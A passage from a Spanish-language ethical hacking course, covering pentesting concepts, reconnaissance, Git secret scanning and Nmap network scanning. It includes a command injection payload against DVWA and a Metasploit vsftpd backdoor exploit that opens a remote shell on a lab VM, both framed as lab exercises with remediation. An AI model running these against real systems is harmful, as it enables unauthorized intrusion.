- Usar **cabeceras de seguridad**: X-Frame-Options, X-XSS-Protection, Content-Security-Policy
- Mantener el software actualizado (Apache, PHP, WordPress, etc.)
- Evitar dejar rutas como `/admin/` expuestas
- Usar WAF y autenticaciÃ³n robusta

---

### ğŸ“š Recursos extra

| Herramienta        | Enlace                                                                             |
| ------------------ | ---------------------------------------------------------------------------------- |
| SpiderFoot         | [https://github.com/smicallef/spiderfoot](https://github.com/smicallef/spiderfoot) |
| Nikto              | [https://github.com/sullo/nikto](https://github.com/sullo/nikto)                   |
| Sitio para pruebas | [http://testphp.vulnweb.com](http://testphp.vulnweb.com)                           |

---

[ğŸ”¼](#Ã­ndice)

---

## **870. Â¿Es necesario un hacking Ã©tico? Hacking Ã©tico como profesiÃ³n**

### âœ… Â¿Es necesario el hacking Ã©tico?

#### ğŸ“Œ **SÃ­, es absolutamente necesario**.

El **hacking Ã©tico** es una **disciplina de ciberseguridad** que consiste en **identificar y corregir vulnerabilidades** en sistemas informÃ¡ticos **antes de que lo hagan los atacantes maliciosos**.

#### ğŸ§  Â¿Por quÃ© es importante?

Imagina que tienes una casa. Â¿DejarÃ­as las puertas abiertas?
Un hacker Ã©tico serÃ­a como un **experto en seguridad** que **prueba todas las puertas y ventanas** para asegurarse de que estÃ©n bien cerradas.

---

### ğŸ”¥ Â¿QuÃ© puede pasar si no hay hacking Ã©tico?

#### Ejemplo real:

- En 2017, Equifax (una empresa financiera) **sufriÃ³ una brecha de datos** donde robaron datos personales de mÃ¡s de **147 millones de personas**.
- Todo por **una vulnerabilidad no corregida** en su servidor web (Apache Struts).

ğŸ’¡ **Un hacker Ã©tico habrÃ­a podido detectar esa vulnerabilidad antes.**

---

### ğŸ‘¨â€ğŸ’» Â¿QuÃ© hace un hacker Ã©tico?

1. Escanea sistemas y redes en busca de fallos.
2. Prueba contraseÃ±as dÃ©biles o servicios abiertos.
3. Intenta explotar vulnerabilidades de forma controlada.
4. Reporta todo lo que encuentra para que sea corregido.
5. A veces ayuda a definir polÃ­ticas de seguridad.

---

### ğŸ›¡ï¸ Â¿CuÃ¡l es la diferencia entre un hacker Ã©tico y uno malicioso?

| Hackers Ã‰ticos (White Hat) ğŸ§‘â€ğŸ’»     | Hackers Maliciosos (Black Hat) ğŸ•µï¸â€â™‚ï¸ |
| --------------------------------- | --------------------------------- |
| Trabajan con permiso legal        | Atacan sin autorizaciÃ³n           |
| Ayudan a proteger                 | Buscan robar o daÃ±ar              |
| Reportan fallos                   | Ocultan sus acciones              |
| Su trabajo es legal y bien pagado | Su trabajo es ilegal              |

---

### ğŸ’¼ Hacking Ã©tico como **profesiÃ³n**

#### ğŸŒ Â¿DÃ³nde trabajan los hackers Ã©ticos?

- Empresas de tecnologÃ­a y telecomunicaciones
- Bancos y aseguradoras
- Gobiernos y fuerzas armadas
- Consultoras de ciberseguridad
- Como **freelancers** o en plataformas de **bug bounty** (HackerOne, Bugcrowd)

---

#### ğŸ’° Â¿CuÃ¡nto gana un hacker Ã©tico?

Depende del paÃ­s y experiencia:

- **Junior** (0-2 aÃ±os): \$500 â€“ \$1500 USD/mes
- **Intermedio** (2-5 aÃ±os): \$1500 â€“ \$4000 USD/mes
- **Senior** (+5 aÃ±os): \$4000 â€“ \$10,000 USD/mes
- **Bug bounty**: puedes ganar de \$50 a miles de dÃ³lares por vulnerabilidad reportada.

---

### ğŸ“š Â¿QuÃ© se necesita para empezar?

#### ğŸ”‘ Conocimientos bÃ¡sicos:

- Redes y protocolos (IP, TCP, DNS, HTTP)
- Sistemas operativos (Linux, Windows)
- ProgramaciÃ³n bÃ¡sica (Python, Bash)
- Herramientas como **Nmap**, **Wireshark**, **Burp Suite**, **Metasploit**
- Saber cÃ³mo funcionan las vulnerabilidades (XSS, SQLi, CSRF, etc.)

#### ğŸ§ª Herramientas de prÃ¡ctica:

- **Kali Linux**
- **Metasploitable**, **DVWA**, **Mutillidae**
- Plataformas: [TryHackMe](https://tryhackme.com/), [Hack The Box](https://hackthebox.com/), [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

### ğŸ› ï¸ Â¿CÃ³mo instalar un entorno de hacking Ã©tico bÃ¡sico?

1. **Instalar Kali Linux** (mÃ¡quina virtual o dual boot):

   - Descarga: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
   - InstÃ¡lalo en VirtualBox:
     [GuÃ­a paso a paso de instalaciÃ³n â†’](https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/)

2. **Instalar mÃ¡quinas vulnerables**:

   - [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
   - [DVWA](https://github.com/digininja/DVWA)
   - [Mutillidae](https://github.com/webpwnized/mutillidae)

3. **Conectarlas en red interna o NAT en VirtualBox** para practicar de forma segura.

---

### âœ… EJEMPLO COMPLETO: simulaciÃ³n de hacking Ã©tico

ğŸ¯ Objetivo: Identificar una vulnerabilidad en un sitio vulnerable y reportarla.

#### Escenario:

Tenemos una mÃ¡quina con **DVWA** (Damn Vulnerable Web Application) y Kali Linux.

#### Fase 1: Reconocimiento

```bash
nmap -sV 192.168.56.101
```

Detectamos un servidor web en el puerto 80.

#### Fase 2: AnÃ¡lisis

Entramos a:
`http://192.168.56.101/DVWA`

Vamos al mÃ³dulo **"Command Injection"**

Probamos:

```bash
127.0.0.1 && whoami
```

ğŸ’¥ Sale como resultado:

```bash
www-data
```

Â¡Vulnerabilidad confirmada!

#### Fase 3: Reporte (como hacker Ã©tico)

Creamos un informe con:

- DescripciÃ³n: Command Injection en parÃ¡metro IP
- Prueba: `127.0.0.1 && whoami`
- Impacto: permite ejecutar comandos arbitrarios
- SoluciÃ³n: sanitizar entradas de usuario

---

### ğŸ§  ConclusiÃ³n

âœ… **El hacking Ã©tico es necesario para proteger sistemas, datos y personas.**

âœ… Puedes practicar legalmente y aprender con laboratorios gratuitos.

âœ… Es una **carrera con alta demanda, buen salario y propÃ³sito Ã©tico.**

---

[ğŸ”¼](#Ã­ndice)

---

## **871. Conceptos. Â¿quÃ© es y quÃ© no es pentesting?**

### ğŸ§  Â¿QuÃ© es el Pentesting?

#### ğŸ” **Pentesting** = Penetration Testing = Pruebas de penetraciÃ³n

Es un proceso **Ã©tico y controlado** en el cual se simula un ataque real contra un sistema, aplicaciÃ³n o red, **con permiso**, para descubrir vulnerabilidades **antes de que lo hagan los atacantes reales**.

---

### âœ… Â¿QuÃ© SÃ es Pentesting?

| âœ… Es...                                     | ExplicaciÃ³n fÃ¡cil                                              |
| -------------------------------------------- | -------------------------------------------------------------- |
| ğŸ” Una **evaluaciÃ³n de seguridad**           | Se analiza quÃ© tan fÃ¡cil serÃ­a vulnerar el sistema.            |
| ğŸ§ª Una **simulaciÃ³n controlada de ataque**   | El pentester actÃºa como un hacker â€œbuenoâ€ (white hat).         |
| ğŸ“‹ Basado en una **metodologÃ­a profesional** | Usa pasos como reconocimiento, escaneo, explotaciÃ³n y reporte. |
| ğŸ“œ **Autorizado legalmente**                 | Siempre se necesita **permiso firmado** (alcance claro).       |
| ğŸ›¡ï¸ Sirve para **fortalecer la seguridad**    | El objetivo es **ayudar**, no daÃ±ar.                           |

---

### âŒ Â¿QuÃ© NO es Pentesting?

| âŒ No es...                        | Por quÃ© no lo es                                         |
| ---------------------------------- | -------------------------------------------------------- |
| ğŸš« Hacking sin permiso             | Eso es **ilegal**, se considera intrusiÃ³n o ciberdelito. |
| ğŸš« Escaneo masivo sin autorizaciÃ³n | Aun si no explotas nada, puede violar leyes.             |
| ğŸš« Ransomware â€œpor diversiÃ³nâ€      | El pentesting **no daÃ±a**, **no secuestra informaciÃ³n**. |
| ğŸš« Ataques destructivos            | No debes borrar nada ni dejar sistemas fuera de lÃ­nea.   |
| ğŸš« Algo improvisado                | Debe seguir **una metodologÃ­a profesional y Ã©tica**.     |

---

### ğŸ§° Â¿QuÃ© necesito para hacer pentesting?

#### Herramientas esenciales:

- **Kali Linux**: distribuciÃ³n de Linux con mÃ¡s de 600 herramientas preinstaladas.
- **Metasploit**: framework para explotaciÃ³n de vulnerabilidades.
- **Nmap**: escÃ¡ner de redes y puertos.
- **Burp Suite**: proxy para pentesting web.
- **Nikto**, **Hydra**, **John the Ripper**, etc.

---

### âš™ï¸ Â¿CÃ³mo instalar un entorno de Pentesting?

#### ğŸ”¹ OpciÃ³n recomendada: VirtualBox + Kali Linux + mÃ¡quina vulnerable

##### Paso 1: Instalar VirtualBox

Descarga desde:
ğŸ‘‰ [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)

Instala como cualquier programa en Windows/macOS/Linux.

---

##### Paso 2: Instalar Kali Linux

1. Descarga la imagen ISO:
   ğŸ‘‰ [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

2. Crea una nueva mÃ¡quina virtual en VirtualBox:

   - Tipo: Linux
   - VersiÃ³n: Debian (64-bit)
   - RAM: mÃ­nimo 2 GB
   - Disco: 20 GB mÃ­nimo

3. Inicia la VM y monta la ISO para instalar.

4. Sigue los pasos del asistente de instalaciÃ³n.

---

##### Paso 3: Instalar mÃ¡quina vulnerable (ej: Metasploitable 2)

1. Descarga Metasploitable 2:
   ğŸ‘‰ [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

2. Importe la VM en VirtualBox â†’ â€œArchivoâ€ â†’ â€œImportar dispositivo virtualâ€.

3. Configura **Red Interna** en ambas mÃ¡quinas para que se comuniquen localmente.

---

### ğŸ” Ejemplo completo: Mini Pentest con Nmap + Metasploit

#### Escenario:

Tienes tu Kali Linux funcionando y una mÃ¡quina Metasploitable 2 corriendo en red interna con IP `192.168.56.101`.

---

##### ğŸ” 1. Reconocimiento con Nmap

En Kali:

```bash
nmap -sV -A 192.168.56.101
```

Resultado (resumido):

```
22/tcp   open  ssh
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
...
```

---

##### ğŸ”§ 2. ExplotaciÃ³n con Metasploit

Lanzamos el framework:

```bash
msfconsole
```

Buscamos un exploit para VSFTPD:

```bash
search vsftpd
```

Cargamos el mÃ³dulo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

ğŸ’¥ Si es vulnerable, abrirÃ¡ una **shell remota**:

```bash
[*] Command shell session 1 opened
```

Ya estÃ¡s **dentro del sistema vulnerable** (solo en entorno de laboratorio legal).

---

##### ğŸ“‹ 3. Reporte (como hacker Ã©tico)

Documento sencillo:

- **Nombre**: vsftpd 2.3.4 vulnerable a backdoor
- **Puerto**: 21/tcp
- **Impacto**: ejecuciÃ³n remota de comandos
- **RecomendaciÃ³n**: actualizar o deshabilitar vsftpd, bloquear puerto si no se usa

---

### âœ… ConclusiÃ³n

- El **pentesting NO es hacking ilegal**, sino una actividad profesional y Ã©tica.
- Se realiza **bajo contrato, con permiso**, y con el fin de **ayudar a las organizaciones a mejorar su seguridad**.
- Puedes empezar en casa usando **Kali Linux y mÃ¡quinas virtuales vulnerables**.
- Aprender paso a paso te prepara para ser un futuro **hacker Ã©tico profesional** ğŸ§‘â€ğŸ’»ğŸ›¡ï¸

---

[ğŸ”¼](#Ã­ndice)

---

## **872. Tipos de pentesting. Fase Pre-ataque**

### ğŸ§  Â¿QuÃ© es el Pentesting?

El **pentesting** o **penetration testing** es una simulaciÃ³n de ataque a sistemas informÃ¡ticos, redes o aplicaciones web con el objetivo de encontrar vulnerabilidades **antes de que lo hagan los hackers maliciosos**.

---

### ğŸ§© TIPOS DE PENTESTING

Hay varias formas de clasificar un pentest. AquÃ­ te muestro las mÃ¡s importantes:

---

#### âœ… 1. SegÃºn el nivel de conocimiento del sistema

| Tipo          | DescripciÃ³n                                                          | Ejemplo fÃ¡cil                                             |
| ------------- | -------------------------------------------------------------------- | --------------------------------------------------------- |
| **Black Box** | No sabes nada del sistema. Eres como un hacker externo.              | Atacar una web solo con su dominio.                       |
| **Gray Box**  | Sabes informaciÃ³n parcial. Como si fueras un usuario medio.          | Tienes una cuenta normal en el sistema.                   |
| **White Box** | Sabes todo: cÃ³digo, infraestructura, IPs. Es una auditorÃ­a profunda. | El cliente te da acceso al cÃ³digo fuente y base de datos. |

---

#### âœ… 2. SegÃºn el objetivo

| Tipo                       | ExplicaciÃ³n                                          | Herramientas comunes               |
| -------------------------- | ---------------------------------------------------- | ---------------------------------- |
| **Pentesting Web**         | Buscas fallos en apps web.                           | Burp Suite, OWASP ZAP, Nikto       |
| **Pentesting de red**      | Buscas puertos abiertos y servicios vulnerables.     | Nmap, Metasploit, Hydra            |
| **Pentesting de sistemas** | Atacas directamente a sistemas operativos.           | Exploits locales, buffer overflows |
| **Pentesting WiFi**        | Buscas vulnerabilidades en redes inalÃ¡mbricas.       | Aircrack-ng, Wireshark             |
| **Pentesting fÃ­sico**      | Intentas acceder fÃ­sicamente a servidores, oficinas. | TÃ©cnicas sociales o acceso fÃ­sico  |

---

### ğŸ§­ FASES DEL PENTESTING: Enfoque general

1. **Pre-ataque (Reconocimiento y escaneo)** â† Nos enfocamos aquÃ­.
2. **Ataque / ExplotaciÃ³n**
3. **Post-explotaciÃ³n / Mantenimiento**
4. **Reporte final**

---

### ğŸ” FASE PRE-ATAQUE: Â¿QuÃ© es y cÃ³mo se hace?

Es la **fase de recolecciÃ³n de informaciÃ³n**, como cuando un ladrÃ³n observa la casa antes de entrar. AquÃ­ **no atacas todavÃ­a**, solo analizas el terreno.

#### ğŸ”¹ Subfases:

| Subfase                  | Â¿QuÃ© haces?                                         | Herramientas                 |
| ------------------------ | --------------------------------------------------- | ---------------------------- |
| ğŸ” Reconocimiento pasivo | Buscas info sin tocar el sistema objetivo.          | Google, whois, Shodan        |
| ğŸ“¡ Reconocimiento activo | Escaneas directamente el objetivo.                  | Nmap, Netcat                 |
| ğŸ§± EnumeraciÃ³n           | Descubres usuarios, servicios, sistemas operativos. | Enum4linux, SMBclient, Nikto |

---

### ğŸ“Œ Ejemplo real:

**Objetivo**: Hacer la fase pre-ataque a `http://testphp.vulnweb.com`

---

### âš™ï¸ INSTALACIÃ“N DEL ENTORNO DE PENTESTING

Vamos a usar:

- âœ… **Kali Linux** (ya viene con todo instalado)
- âœ… **VirtualBox** o **mÃ¡quina fÃ­sica**
- âœ… Un objetivo vulnerable (por ejemplo, la web de prueba de Acunetix)

#### ğŸ”¸ OpciÃ³n 1: Usar Kali Linux en VirtualBox

1. Descarga Kali desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Importa la VM en VirtualBox
3. Actualiza el sistema:

```bash
sudo apt update && sudo apt upgrade -y
```

---

### ğŸ§ª EJEMPLO COMPLETO DE FASE PRE-ATAQUE

#### ğŸ•µï¸â€â™‚ï¸ Objetivo: `http://testphp.vulnweb.com`

---

#### 1. RECONOCIMIENTO PASIVO

##### ğŸ”¹ Usamos `whois`:

```bash
whois testphp.vulnweb.com
```

> Muestra el dueÃ±o del dominio, paÃ­s, correo del registrante.

---

##### ğŸ”¹ Buscamos con Google Hacking:

```text
site:testphp.vulnweb.com inurl:admin
```

> Esto busca pÃ¡ginas relacionadas a â€œadminâ€ dentro de esa web.

---

#### 2. RECONOCIMIENTO ACTIVO

##### ğŸ”¹ Escaneo con `nmap`

```bash
nmap -sS -sV -O testphp.vulnweb.com
```

ParÃ¡metros:

- `-sS`: escaneo sigiloso (SYN scan)
- `-sV`: detecta versiÃ³n de servicios
- `-O`: detecta sistema operativo

Resultado esperado:

```text
80/tcp open  http Apache httpd 2.4.18
OS: Linux
```

---

#### 3. ENUMERACIÃ“N

##### ğŸ”¹ Usamos `nikto`:

```bash
nikto -h http://testphp.vulnweb.com
```

Nikto te dirÃ¡:

- Versiones desactualizadas
- Archivos ocultos
- Formularios inseguros

---

### ğŸ“‹ Resultado final

Ya tienes:

- InformaciÃ³n del sistema operativo
- Servicios corriendo (HTTP en puerto 80)
- Rutas inseguras (como `/admin`, `/login`, etc.)
- Posibles vectores para atacar en la siguiente fase

---

### âœ… CONCLUSIÃ“N

- El **pre-ataque** es la base de cualquier pentest serio.
- Nunca atacas sin conocer primero el objetivo.
- Herramientas clave: `nmap`, `whois`, `nikto`, Google Hacking
- Ya estÃ¡s en camino para convertirte en **hacker Ã©tico profesional** ğŸ§‘â€ğŸ’»

---

[ğŸ”¼](#Ã­ndice)

---

## **873. PrÃ¡ctica: Buscando secretos en repositorios GIT**

### ğŸ§  Â¿QuÃ© significa buscar â€œsecretosâ€ en Git?

En seguridad informÃ¡tica, **â€œsecretosâ€** se refiere a **contraseÃ±as, tokens de API, claves privadas, etc.** que los desarrolladores a veces suben sin querer a sus repositorios Git (como GitHub o GitLab).

Ejemplos de secretos comunes:

- ğŸ”‘ Claves de AWS (`AKIA...`)
- ğŸ” Tokens de GitHub o Discord
- ğŸ” Archivos `.env` con credenciales
- ğŸ”“ ContraseÃ±as en texto plano en archivos de configuraciÃ³n

Un atacante puede buscar esos secretos para:

- Acceder a servidores, cuentas de servicios cloud
- Robar datos o causar daÃ±os

---

### ğŸ§° Herramientas que usaremos

Vamos a instalar y usar:

| Herramienta                                                      | Â¿Para quÃ© sirve?                                      |
| ---------------------------------------------------------------- | ----------------------------------------------------- |
| ğŸ” `git clone`                                                   | Clonar un repositorio vulnerable                      |
| ğŸ” [`git log`](https://git-scm.com/docs/git-log)                 | Ver historial de commits                              |
| â®ï¸ `git checkout`                                                | Volver a versiones anteriores                         |
| ğŸ› ï¸ [`truffleHog`](https://github.com/trufflesecurity/trufflehog) | Herramienta automÃ¡tica para buscar secretos           |
| ğŸ“ [`gitleaks`](https://github.com/gitleaks/gitleaks)            | Otra herramienta muy potente para anÃ¡lisis automÃ¡tico |

---

### ğŸ–¥ï¸ InstalaciÃ³n (en Kali Linux u otro Linux)

#### âœ… Requisitos previos:

```bash
sudo apt update
sudo apt install git python3-pip -y
```

---

#### ğŸ”¹ Instalar `truffleHog`:

```bash
pip install truffleHog
```

> Esto instala la herramienta para buscar secretos en el historial Git.

---

#### ğŸ”¹ Instalar `gitleaks` (opcional):

```bash
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks-linux-amd64 -O gitleaks
chmod +x gitleaks
sudo mv gitleaks /usr/local/bin
```

---

### ğŸ§ª EJEMPLO COMPLETO PASO A PASO

Vamos a analizar un repositorio real (de ejemplo) y buscar secretos.

#### ğŸ§· Repositorio vulnerable de ejemplo:

```bash
git clone https://github.com/gwen001/pentest-tools.git
cd pentest-tools
```

---

##### ğŸ” Paso 1: Revisar manualmente con comandos Git

```bash
git log --oneline
```

> Muestra el historial de commits.

Busca mensajes sospechosos como:

- â€œadd config fileâ€
- â€œfix token issueâ€
- â€œupdate .envâ€

---

##### â®ï¸ Paso 2: Volver a un commit especÃ­fico (si quieres)

```bash
git checkout <commit-id>
```

Luego puedes inspeccionar con:

```bash
cat config.py
cat .env
```

---

##### âš™ï¸ Paso 3: Usar `truffleHog` para buscar secretos automÃ¡ticamente

```bash
trufflehog git https://github.com/gwen001/pentest-tools.git
```

TruffleHog escanearÃ¡ todo el historial y te dirÃ¡ si encontrÃ³:

âœ… Tokens

âœ… ContraseÃ±as

âœ… AWS Keys

âœ… Archivos `.env`

âœ… InformaciÃ³n sensible

---

#### ğŸ§ª Otro ejemplo con `gitleaks`

```bash
gitleaks detect --source=. --report-path=gitleaks-report.json
```

Te generarÃ¡ un reporte JSON con las posibles filtraciones de secretos.

---

### ğŸ“Œ Â¿QuÃ© aprendiste?

- Puedes buscar secretos manualmente revisando el historial de commits.
- Herramientas como **truffleHog** y **gitleaks** lo hacen automÃ¡ticamente.
- Repositorios mal gestionados pueden contener credenciales expuestas.
- Muchos pentesters y bug hunters usan esto para encontrar vulnerabilidades de configuraciÃ³n.

---

### ğŸ›¡ï¸ Â¿CÃ³mo se previene?

âœ… Nunca subas archivos `.env`, `.pem`, `.key`, etc.

âœ… Usa `.gitignore` correctamente.

âœ… Usa herramientas de escaneo antes de hacer `git push`.

âœ… Revoca cualquier clave filtrada inmediatamente.

---

[ğŸ”¼](#Ã­ndice)

---

## **874. IntroducciÃ³n al escaneo de redes**

### ğŸ§  Â¿QuÃ© es el escaneo de redes?

El **escaneo de redes** es una tÃ©cnica utilizada para **identificar dispositivos (hosts), puertos abiertos, servicios y sistemas operativos** en una red. Es **una de las fases mÃ¡s importantes del hacking Ã©tico y el pentesting**, y forma parte de la **fase de reconocimiento activo**.

#### ğŸ“ Objetivos:

- Saber **quiÃ©n estÃ¡ en la red**
- Saber **quÃ© servicios estÃ¡n corriendo**
- Identificar **vulnerabilidades potenciales**
- Descubrir **puntos de entrada para un ataque controlado**

---

### ğŸ§© Tipos de escaneo

| Tipo de escaneo     | Â¿QuÃ© hace?                                 | Herramienta comÃºn     |
| ------------------- | ------------------------------------------ | --------------------- |
| ğŸ§­ Ping Scan        | Verifica quÃ© hosts estÃ¡n activos           | `nmap -sn`            |
| ğŸ” Port Scan        | Busca puertos abiertos                     | `nmap -p`             |
| ğŸ§± Service Scan     | Detecta servicios y versiones              | `nmap -sV`            |
| ğŸ–¥ï¸ OS Detection     | Intenta detectar el sistema operativo      | `nmap -O`             |
| ğŸ“ TopologÃ­a de red | Descubre cÃ³mo se conectan los dispositivos | `nmap`, `netdiscover` |

---

### ğŸ› ï¸ Herramientas para escaneo de redes

Las mÃ¡s comunes (todas se pueden usar en **Kali Linux** o Ubuntu):

| Herramienta          | Para quÃ© sirve                                         |
| -------------------- | ------------------------------------------------------ |
| **Nmap**             | La mÃ¡s conocida. Escanea puertos, hosts, versiones, OS |
| **Netdiscover**      | Detecta dispositivos en redes LAN                      |
| **Angry IP Scanner** | GUI para Windows/Linux fÃ¡cil de usar                   |
| **Zenmap**           | Interfaz grÃ¡fica de Nmap                               |
| **Masscan**          | Escaneo rÃ¡pido a gran escala                           |

---

### âš™ï¸ InstalaciÃ³n de herramientas (si no estÃ¡s en Kali)

#### âœ… Instalar Nmap:

```bash
sudo apt update
sudo apt install nmap -y
```

#### âœ… Instalar Netdiscover:

```bash
sudo apt install netdiscover -y
```

---

### ğŸ§ª EJEMPLO COMPLETO: Escaneo paso a paso

Vamos a usar **Nmap y Netdiscover** para hacer un escaneo en una red local (por ejemplo, una red WiFi a la que estÃ¡s conectado desde Kali o cualquier distro Linux).

---

#### ğŸ›œ 1. Obtener tu IP local y tu rango de red

Primero necesitas saber tu IP:

```bash
ip a
```

Ejemplo:

```text
inet 192.168.1.15/24
```

Tu red serÃ­a `192.168.1.0/24`

---

#### ğŸ” 2. Escanear la red para ver quÃ© dispositivos estÃ¡n activos (Ping scan)

```bash
nmap -sn 192.168.1.0/24
```

Resultado:

```text
Host 192.168.1.1 is up (router)
Host 192.168.1.10 is up (laptop)
Host 192.168.1.20 is up (Smart TV)
```

---

#### ğŸ” 3. Escaneo de puertos abiertos en un host

Escanea un dispositivo especÃ­fico (por ejemplo, tu router):

```bash
nmap -p 1-1000 192.168.1.1
```

Resultado:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  closed https
```

---

#### ğŸ“¦ 4. Detectar servicios y versiÃ³n del software

```bash
nmap -sV 192.168.1.1
```

Resultado:

```text
80/tcp open http    lighttpd 1.4.35
22/tcp open ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
```

---

#### ğŸ–¥ï¸ 5. Detectar el sistema operativo del host

```bash
nmap -O 192.168.1.1
```

Resultado:

```text
OS: Linux 3.X | 4.X
```

> Esto es Ãºtil para planear posibles exploits.

---

#### ğŸ“¡ 6. Escanear toda la red con Netdiscover

```bash
sudo netdiscover
```

Te muestra una tabla como esta:

```
IP              MAC Address        Vendor
192.168.1.1     00:14:22:01:23:45  TP-Link
192.168.1.15    44:87:FC:AB:12:34  Dell
192.168.1.22    58:55:CA:BB:66:77  Samsung
```

---

### ğŸ” Â¿QuÃ© aprendiste con esto?

âœ… CÃ³mo identificar los dispositivos activos

âœ… CÃ³mo saber quÃ© puertos tienen abiertos

âœ… CÃ³mo detectar servicios y sistemas operativos

âœ… CÃ³mo visualizar la topologÃ­a de tu red

âœ… CÃ³mo usar herramientas bÃ¡sicas como Nmap y Netdiscover

---

[ğŸ”¼](#Ã­ndice)

---

## **875. PrÃ¡ctica: Escaneo de redes con Nmap**

### ğŸ§  Â¿QuÃ© es Nmap?

**Nmap (Network Mapper)** es una herramienta de cÃ³digo abierto utilizada por administradores de red, hackers Ã©ticos y pentesters para:

âœ… Escanear redes

âœ… Detectar hosts activos

âœ… Identificar puertos abiertos

âœ… Reconocer servicios (como SSH, HTTP, FTP)

âœ… Saber quÃ© sistema operativo usa un dispositivo

> Es una de las herramientas mÃ¡s usadas en **reconocimiento activo**.

---

### ğŸ“¦ Â¿CÃ³mo se instala Nmap?

#### ğŸ”¹ En **Kali Linux** ya viene instalado.

Pero si usas otra distro (Ubuntu, Debian), puedes instalarlo asÃ­:

```bash
sudo apt update
sudo apt install nmap -y
```

#### ğŸ”¹ En **Windows**

1. Ir a la pÃ¡gina oficial: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Descargar el **â€œNmap Windows Installerâ€**
3. Instalar normalmente como cualquier programa
4. Se incluye la interfaz grÃ¡fica llamada **Zenmap**

---

### âœ… Comandos bÃ¡sicos de Nmap

| Comando                     | Â¿QuÃ© hace?                                                  |
| --------------------------- | ----------------------------------------------------------- |
| `nmap -sn 192.168.1.0/24`   | Escaneo de red para descubrir hosts activos                 |
| `nmap -p 22,80 192.168.1.1` | Escanea puertos especÃ­ficos                                 |
| `nmap -p- 192.168.1.1`      | Escanea **todos** los puertos                               |
| `nmap -sV 192.168.1.1`      | Detecta versiones de servicios                              |
| `nmap -O 192.168.1.1`       | Detecta el sistema operativo                                |
| `nmap -A 192.168.1.1`       | Escaneo agresivo (todo junto: OS, versiÃ³n, traceroute, etc) |

---

### âš ï¸ Importante

No debes escanear redes sin autorizaciÃ³n. Estas prÃ¡cticas deben realizarse en:

âœ… Tu propia red

âœ… MÃ¡quinas virtuales controladas

âœ… Laboratorios tipo Hack The Box, TryHackMe o redes locales

---

### ğŸ§ª PRÃCTICA COMPLETA: Escaneo con Nmap paso a paso

Supongamos que estÃ¡s en tu casa conectado al Wi-Fi y quieres ver quÃ© dispositivos hay conectados y quÃ© servicios ofrecen.

---

#### ğŸ“ Paso 1: Ver tu IP y tu red

```bash
ip a
```

Ejemplo:

```
inet 192.168.1.15/24
```

Entonces tu red es: `192.168.1.0/24`

---

#### ğŸ” Paso 2: Escanear la red para ver los dispositivos conectados

```bash
nmap -sn 192.168.1.0/24
```

Esto te da una lista de dispositivos que estÃ¡n activos (responden al ping):

```
Nmap scan report for 192.168.1.1
Host is up (0.0031s latency).
MAC Address: A4:5E:60:12:34:56 (Tp-Link)

Nmap scan report for 192.168.1.15
Host is up (0.0002s latency).
MAC Address: D4:BE:D9:87:65:43 (Dell)

Nmap scan report for 192.168.1.22
Host is up (0.0021s latency).
MAC Address: 58:55:CA:33:44:55 (Samsung)
```

---

#### ğŸ” Paso 3: Escanear puertos abiertos en un host

Por ejemplo, tu router estÃ¡ en `192.168.1.1`:

```bash
nmap -p 1-1000 192.168.1.1
```

Resultado:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  closed https
```

---

#### ğŸ”¬ Paso 4: Detectar versiÃ³n de servicios

```bash
nmap -sV 192.168.1.1
```

Resultado:

```
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open http Apache httpd 2.4.29
```

---

#### ğŸ§  Paso 5: Detectar sistema operativo

```bash
sudo nmap -O 192.168.1.1
```

Resultado:

```
OS: Linux 2.6.32 - 4.9
```

---

#### ğŸ§¨ Paso 6 (opcional): Escaneo agresivo

```bash
sudo nmap -A 192.168.1.1
```

Incluye detecciÃ³n de OS, versiÃ³n, traceroute y mÃ¡s.

---

### âœ… Resultado Final (Resumen de tu prÃ¡ctica)

- Descubriste quÃ© dispositivos estÃ¡n conectados a tu red
- Escaneaste los puertos abiertos del router o un host
- Detectaste quÃ© servicios corren (como HTTP, SSH)
- Supiste quÃ© sistema operativo estÃ¡ usando ese host

---

### ğŸ§  Consejos para mejorar

- Prueba esto en una red virtual con Kali + otra mÃ¡quina (como Metasploitable)
- Usa `-T4` o `-T5` para acelerar escaneos
- Guarda resultados: `nmap -oN resultado.txt 192.168.1.1`

---

[ğŸ”¼](#Ã­ndice)

---

## **876. Fase de Ataque. Testing de aplicaciones web con Burp suite**

### ğŸ§  Â¿QuÃ© es Burp Suite?

**Burp Suite** es una herramienta profesional y gratuita (versiÃ³n Community) para realizar **tests de seguridad en aplicaciones web**. Es uno de los programas mÃ¡s usados por hackers Ã©ticos, bug bounty hunters y pentesters.

Permite:

âœ… Interceptar peticiones HTTP/HTTPS

âœ… Manipular formularios, cookies y parÃ¡metros

âœ… Buscar vulnerabilidades (XSS, SQLi, CSRF, etc.)

âœ… Automatizar escaneos de seguridad

âœ… Realizar ataques dirigidos con mÃ³dulos como **Intruder**

---

### ğŸ” Â¿En quÃ© fase del hacking entra Burp Suite?

Burp se usa en la **fase de ataque**, despuÃ©s de hacer reconocimiento. Cuando ya sabes quÃ© sitio atacar, puedes usar Burp para **interactuar directamente con la web**, manipular formularios, enviar payloads, etc.

---

### ğŸ› ï¸ Â¿CÃ³mo se instala Burp Suite?

#### âœ… En Kali Linux viene preinstalado

Abre el menÃº > Web Application Analysis > **Burp Suite Community Edition**

O desde terminal:

```bash
burpsuite
```

---

#### âœ… En Windows o Linux manualmente

1. Ve a: [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
2. Elige la versiÃ³n para tu sistema operativo
3. InstÃ¡lalo como cualquier otro programa

---

### ğŸ§° Requisitos para usar Burp correctamente

